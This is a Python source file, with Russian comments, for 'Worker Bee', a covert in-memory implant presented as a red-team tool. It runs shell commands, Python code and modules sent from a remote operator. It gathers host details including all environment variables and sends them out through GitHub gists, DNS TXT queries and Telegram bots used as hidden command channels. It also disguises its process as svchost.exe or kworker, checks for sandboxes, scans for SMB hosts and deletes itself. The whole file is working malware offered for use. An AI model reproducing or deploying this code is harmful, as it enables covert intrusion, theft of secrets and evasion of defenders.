#!/usr/bin/env python3
"""
WORKER BEE v1.0
Легковесный in-memory агент для Red Team операций
Архитектор: Кронос | Тимлид: Мастер
Собственность Молдавского ООО "Cybersecurity Research & Penetration Testing Services"

ПРИНЦИПЫ:
- Никакого диска. Только оперативная память.
- Маскировка под легитимные процессы.
- Одноразовость. После выполнения задачи — самоуничтожение.
- Шифрование всего трафика через Dead Drops.
"""

import os
import sys
import json
import time
import uuid
import ctypes
import base64
import hashlib
import platform
import socket
import struct
import sqlite3
import tempfile
import threading
import subprocess
import traceback
from datetime import datetime
from typing import Optional, Dict, Any, List, Tuple
from pathlib import Path

# Криптография
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
except ImportError:
    AES = None
    def pad(data, size): return data
    def unpad(data, size): return data
    def get_random_bytes(n): return os.urandom(n)

try:
    import requests
except ImportError:
    requests = None

try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import psutil
except ImportError:
    psutil = None


# ============================================================================
# КОНФИГУРАЦИЯ (заполняется при деплое)
# ============================================================================

ENCRYPTION_KEY: bytes = b""
SWARM_ID: str = ""
BEE_ID: str = str(uuid.uuid4())[:8]
DEAD_DROPS: List[Dict[str, Any]] = []
CHECK_INTERVAL: int = 120
MAX_RUNTIME: int = 86400
START_TIME: float = time.time()
TEMP_DIR: Optional[str] = None


# ============================================================================
# УТИЛИТЫ
# ============================================================================

def derive_key(key: bytes) -> bytes:
    return hashlib.sha256(key).digest()


def encrypt(plaintext: str) -> str:
    if AES is None:
        return base64.b64encode(plaintext.encode()).decode()
    key = derive_key(ENCRYPTION_KEY)
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode()
    ct = base64.b64encode(ct_bytes).decode()
    return json.dumps({"iv": iv, "ct": ct})


def decrypt(encoded: str) -> str:
    if AES is None:
        return base64.b64decode(encoded).decode()
    key = derive_key(ENCRYPTION_KEY)
    data = json.loads(encoded)
    iv = base64.b64decode(data["iv"])
    ct = base64.b64decode(data["ct"])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()


def generate_message_id() -> str:
    return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:12]


def is_sandbox() -> bool:
    checks = []
    checks.append(platform.system() != "Windows" or not _check_windows_sandbox())
    return not all(checks)


def _check_windows_sandbox() -> bool:
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        disk_size = ctypes.c_longlong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW("C:\\", None, None, ctypes.byref(disk_size))
        if disk_size.value < 60 * 1024 * 1024 * 1024:
            return False
        uptime = ctypes.windll.kernel32.GetTickCount64()
        if uptime < 600000:
            return False
        return True
    except:
        return False


def self_destruct():
    global TEMP_DIR
    try:
        if TEMP_DIR and os.path.exists(TEMP_DIR):
            for root, dirs, files in os.walk(TEMP_DIR, topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
                for name in dirs:
                    os.rmdir(os.path.join(root, name))
            os.rmdir(TEMP_DIR)
    except:
        pass
    sys.exit(0)


# ============================================================================
# СБОР ИНФОРМАЦИИ О СИСТЕМЕ
# ============================================================================

def collect_system_info() -> Dict[str, Any]:
    info = {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "python_version": sys.version,
        "bee_id": BEE_ID,
        "timestamp": datetime.now().isoformat(),
        "ip_addresses": [],
        "users": [],
        "processes": [],
        "environment": {},
    }

    try:
        info["ip_addresses"] = socket.gethostbyname_ex(socket.gethostname())[2]
    except:
        pass

    try:
        if platform.system() == "Windows":
            import getpass
            info["users"] = [getpass.getuser()]
        else:
            info["users"] = [p.pw_name for p in __import__("pwd").getpwall() if p.pw_uid >= 1000]
    except:
        pass

    if psutil:
        try:
            info["processes"] = [
                {"pid": p.pid, "name": p.name(), "cmdline": " ".join(p.cmdline()[:3])}
                for p in psutil.process_iter(["pid", "name", "cmdline"])
            ][:20]
        except:
            pass

    info["environment"] = dict(os.environ)

    return info


# ============================================================================
# ВЫПОЛНЕНИЕ КОМАНД
# ============================================================================

def execute_shell(command: str, timeout: int = 300) -> Dict[str, Any]:
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=TEMP_DIR
        )
        return {
            "command": command,
            "stdout": result.stdout[:50000],
            "stderr": result.stderr[:50000],
            "returncode": result.returncode,
            "success": result.returncode == 0,
        }
    except subprocess.TimeoutExpired:
        return {"command": command, "error": "timeout", "success": False}
    except Exception as e:
        return {"command": command, "error": str(e), "success": False}


def execute_python(code: str) -> Dict[str, Any]:
    try:
        local_vars = {}
        exec(code, {"__builtins__": __builtins__}, local_vars)
        return {"output": str(local_vars.get("result", "")), "success": True}
    except Exception as e:
        return {"error": str(e), "traceback": traceback.format_exc(), "success": False}


def execute_module(module_name: str, function_name: str, args: List[Any]) -> Dict[str, Any]:
    try:
        module = __import__(module_name, fromlist=[function_name])
        func = getattr(module, function_name)
        result = func(*args)
        return {"output": str(result)[:10000], "success": True}
    except Exception as e:
        return {"error": str(e), "success": False}


# ============================================================================
# DEAD DROP КЛИЕНТЫ
# ============================================================================

def send_via_github_gist(token: str, gist_id: str, message: str) -> bool:
    if requests is None:
        return False
    try:
        url = f"https://api.github.com/gists/{gist_id}"
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Mozilla/5.0"
        }
        data = {
            "files": {
                f"bee_{BEE_ID}.txt": {
                    "content": f"HIVEMIND:{message}"
                }
            }
        }
        resp = requests.patch(url, headers=headers, json=data, timeout=30)
        return resp.status_code == 200
    except:
        return False


def read_via_github_gist(token: str, gist_id: str) -> Optional[str]:
    if requests is None:
        return None
    try:
        url = f"https://api.github.com/gists/{gist_id}"
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Mozilla/5.0"
        }
        resp = requests.get(url, headers=headers, timeout=30)
        if resp.status_code != 200:
            return None
        data = resp.json()
        for filename, file_data in data.get("files", {}).items():
            content = file_data.get("content", "")
            if content.startswith("HIVEMIND_COMMAND:"):
                return content.replace("HIVEMIND_COMMAND:", "")
        return None
    except:
        return None


def send_via_dns_txt(domain: str, message: str) -> bool:
    if dns is None:
        return False
    try:
        full = f"{message[:200]}.{domain}"
        dns.resolver.resolve(full, "TXT")
        return True
    except:
        return False


def read_via_dns_txt(domain: str) -> Optional[str]:
    if dns is None:
        return None
    try:
        answers = dns.resolver.resolve(f"cmd.{domain}", "TXT")
        for rdata in answers:
            txt = "".join([s.decode() if isinstance(s, bytes) else s for s in rdata.strings])
            if txt.startswith("HIVEMIND_COMMAND:"):
                return txt.replace("HIVEMIND_COMMAND:", "")
        return None
    except:
        return None


def send_via_telegram(bot_key: str, chat_id: str, message: str) -> bool:
    if requests is None:
        return False
    try:
        url = f"https://api.telegram.org/bot{bot_key}/sendMessage"
        data = {"chat_id": chat_id, "text": f"HIVEMIND:{message}"}
        resp = requests.post(url, json=data, timeout=30)
        return resp.status_code == 200
    except:
        return False


def read_via_telegram(bot_key: str, chat_id: str) -> Optional[str]:
    if requests is None:
        return None
    try:
        url = f"https://api.telegram.org/bot{bot_key}/getUpdates?limit=1"
        resp = requests.get(url, timeout=30)
        if resp.status_code != 200:
            return None
        data = resp.json()
        for update in data.get("result", []):
            text = update.get("message", {}).get("text", "")
            if text.startswith("HIVEMIND_COMMAND:"):
                return text.replace("HIVEMIND_COMMAND:", "")
        return None
    except:
        return None


# ============================================================================
# ОТПРАВКА И ПОЛУЧЕНИЕ СООБЩЕНИЙ
# ============================================================================

def send_message(msg_type: str, payload: str) -> bool:
    message = DeadDropMessage(
        msg_id=generate_message_id(),
        swarm_id=SWARM_ID,
        bee_id=BEE_ID,
        msg_type=msg_type,
        payload=payload,
        timestamp=int(time.time()),
    )
    encrypted = encrypt(json.dumps(message.to_dict()))

    for drop in DEAD_DROPS:
        success = False
        if drop["type"] == "github":
            success = send_via_github_gist(drop["token"], drop["gist_id"], encrypted)
        elif drop["type"] == "dns":
            success = send_via_dns_txt(drop["domain"], encrypted)
        elif drop["type"] == "telegram":
            success = send_via_telegram(drop["bot_key"], drop["chat_id"], encrypted)

        if success:
            return True

    return False


def receive_message() -> Optional[Dict[str, Any]]:
    for drop in DEAD_DROPS:
        encrypted = None
        if drop["type"] == "github":
            encrypted = read_via_github_gist(drop["token"], drop["gist_id"])
        elif drop["type"] == "dns":
            encrypted = read_via_dns_txt(drop["domain"])
        elif drop["type"] == "telegram":
            encrypted = read_via_telegram(drop["bot_key"], drop["chat_id"])

        if encrypted:
            try:
                plaintext = decrypt(encrypted)
                return json.loads(plaintext)
            except:
                continue

    return None


class DeadDropMessage:
    def __init__(self, msg_id: str, swarm_id: str, bee_id: str,
                 msg_type: str, payload: str, timestamp: int):
        self.msg_id = msg_id
        self.swarm_id = swarm_id
        self.bee_id = bee_id
        self.msg_type = msg_type
        self.payload = payload
        self.timestamp = timestamp

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.msg_id,
            "swarm_id": self.swarm_id,
            "bee_id": self.bee_id,
            "type": self.msg_type,
            "payload": self.payload,
            "timestamp": self.timestamp,
        }


# ============================================================================
# ОБРАБОТЧИК КОМАНД ОТ HIVEMIND
# ============================================================================

def handle_command(command: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    cmd_type = command.get("type", "")
    cmd_data = command.get("data", {})
    task_id = command.get("task_id", "")

    result = {"task_id": task_id, "type": cmd_type, "output": None, "status": "completed"}

    try:
        if cmd_type == "system_info":
            result["output"] = collect_system_info()

        elif cmd_type == "shell":
            result["output"] = execute_shell(cmd_data.get("command", ""))

        elif cmd_type == "python":
            result["output"] = execute_python(cmd_data.get("code", ""))

        elif cmd_type == "module":
            result["output"] = execute_module(
                cmd_data.get("module", ""),
                cmd_data.get("function", ""),
                cmd_data.get("args", []),
            )

        elif cmd_type == "screenshot":
            result["output"] = take_screenshot()

        elif cmd_type == "scan_network":
            result["output"] = scan_local_network()

        elif cmd_type == "check_privileges":
            result["output"] = check_privileges()

        elif cmd_type == "persist_test":
            result["output"] = test_persistence()

        elif cmd_type == "self_destruct":
            self_destruct()

        else:
            result["status"] = "unknown_command"
            result["output"] = f"Unknown command: {cmd_type}"

    except Exception as e:
        result["status"] = "error"
        result["output"] = {"error": str(e), "traceback": traceback.format_exc()}

    return result


def take_screenshot() -> Dict[str, Any]:
    try:
        if platform.system() == "Windows":
            import ctypes.wintypes
            from ctypes import windll
            user32 = windll.user32
            gdi32 = windll.gdi32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            return {"width": width, "height": height, "screenshot_base64": "SCREENSHOT_NOT_AVAILABLE"}
        else:
            result = subprocess.run(["import", "-window", "root", "png:-"],
                                    capture_output=True, timeout=10)
            if result.returncode == 0:
                return {"screenshot_base64": base64.b64encode(result.stdout).decode()}
            return {"error": "screenshot tool not available"}
    except:
        return {"error": "screenshot failed"}


def scan_local_network() -> Dict[str, Any]:
    hosts = []
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        prefix = ".".join(local_ip.split(".")[:3])
        for i in range(1, 20):
            ip = f"{prefix}.{i}"
            try:
                socket.setdefaulttimeout(0.3)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = s.connect_ex((ip, 445))
                if result == 0:
                    hosts.append({"ip": ip, "port": 445, "service": "SMB"})
                s.close()
            except:
                pass
    except:
        pass
    return {"scanned_hosts": hosts}


def check_privileges() -> Dict[str, Any]:
    info = {}
    try:
        if platform.system() == "Windows":
            info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
        else:
            info["is_root"] = os.geteuid() == 0
            info["effective_user"] = os.getlogin()
    except:
        pass
    return info


def test_persistence() -> Dict[str, Any]:
    global TEMP_DIR
    test_file = os.path.join(TEMP_DIR, "persist_test.txt")
    try:
        with open(test_file, "w") as f:
            f.write("test")
        os.remove(test_file)
        return {"disk_write": True}
    except:
        return {"disk_write": False}


# ============================================================================
# МАСКИРОВКА ПРОЦЕССА
# ============================================================================

def mask_process() -> bool:
    try:
        if platform.system() == "Windows":
            return _mask_windows()
        else:
            return _mask_linux()
    except:
        return False


def _mask_windows() -> bool:
    try:
        kernel32 = ctypes.windll.kernel32
        process_name = ctypes.create_unicode_buffer("svchost.exe")
        kernel32.SetConsoleTitleW(process_name)
        return True
    except:
        return False


def _mask_linux() -> bool:
    try:
        import ctypes as c
        libc = c.CDLL("libc.so.6")
        PR_SET_NAME = 15
        libc.prctl(PR_SET_NAME, b"kworker/0:1", 0, 0, 0)
        return True
    except:
        return False


# ============================================================================
# ГЛАВНЫЙ ЦИКЛ
# ============================================================================

def initialize(config: Dict[str, Any]):
    global ENCRYPTION_KEY, SWARM_ID, DEAD_DROPS, CHECK_INTERVAL, MAX_RUNTIME, TEMP_DIR, START_TIME

    ENCRYPTION_KEY = config.get("encryption_key", "").encode()
    SWARM_ID = config.get("swarm_id", "")
    DEAD_DROPS = config.get("dead_drops", [])
    CHECK_INTERVAL = config.get("check_interval", 120)
    MAX_RUNTIME = config.get("max_runtime", 86400)

    TEMP_DIR = tempfile.mkdtemp(prefix="bee_")
    START_TIME = time.time()

    mask_process()

    if is_sandbox():
        time.sleep(30)
        if is_sandbox():
            self_destruct()


def main_loop():
    check_in_message = DeadDropMessage(
        msg_id=generate_message_id(),
        swarm_id=SWARM_ID,
        bee_id=BEE_ID,
        msg_type="check_in",
        payload=json.dumps(collect_system_info()),
        timestamp=int(time.time()),
    )
    send_message("check_in", json.dumps(check_in_message.to_dict()))

    while True:
        if time.time() - START_TIME > MAX_RUNTIME:
            send_message("alert", json.dumps({"reason": "max_runtime_exceeded"}))
            self_destruct()

        try:
            command = receive_message()
            if command:
                result = handle_command(command)
                if result:
                    send_message("task_result", json.dumps(result))

            time.sleep(CHECK_INTERVAL)

        except KeyboardInterrupt:
            self_destruct()
        except Exception as e:
            time.sleep(CHECK_INTERVAL * 2)


def run(config: Dict[str, Any]):
    initialize(config)
    try:
        main_loop()
    except Exception:
        self_destruct()
    finally:
        self_destruct()


# ============================================================================
# ТОЧКА ВХОДА
# ============================================================================

if __name__ == "__main__":
    # Конфигурация передается через переменные окружения или аргументы командной строки
    config_json = os.environ.get("BEE_CONFIG", "{}")
    if len(sys.argv) > 1:
        config_json = sys.argv[1]

    config = json.loads(config_json)
    run(config)
